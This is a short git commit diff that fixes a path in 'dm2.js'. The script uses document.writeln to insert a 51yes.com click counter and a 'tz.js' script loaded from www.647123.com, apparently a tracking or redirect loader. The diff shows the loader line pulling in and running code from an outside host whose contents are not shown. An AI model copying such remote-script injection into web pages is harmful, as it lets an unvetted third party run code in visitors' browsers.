37b009eaecdfc77d16e10634bd17c73544dbc9c2
js999999999 <js-9@outlook.com>
2017-11-18 12:49:21 +0800

    Update dm2.js

--- cc1z/dm2.js
+++ cc1z/dm2.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count7.51yes.com\/click.aspx?id=70863467&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/cc11z/tz.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/cc1z/tz.js ><\/script>");
